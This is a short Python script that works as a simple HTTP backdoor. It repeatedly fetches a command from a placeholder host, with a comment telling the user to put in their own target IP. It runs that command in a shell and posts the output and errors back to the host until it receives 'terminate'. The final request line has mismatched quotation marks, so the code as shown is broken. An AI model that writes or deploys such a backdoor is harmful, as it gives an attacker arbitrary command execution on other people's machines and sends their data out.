import subprocess
import requests
import time

while True:
    req=requests.get('http://127.0.0.1')#use your own target ip here
    command=req.text
    
    if 'terminate' in command:
        break
    else:
        cmd=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_resp=requests.post("http://127.0.0.1",data=cmd.stdout.read())
        post_resp=requests.post('http://127.0.0.1",data=cmd.stderr.read())
    time.sleep(3)
    
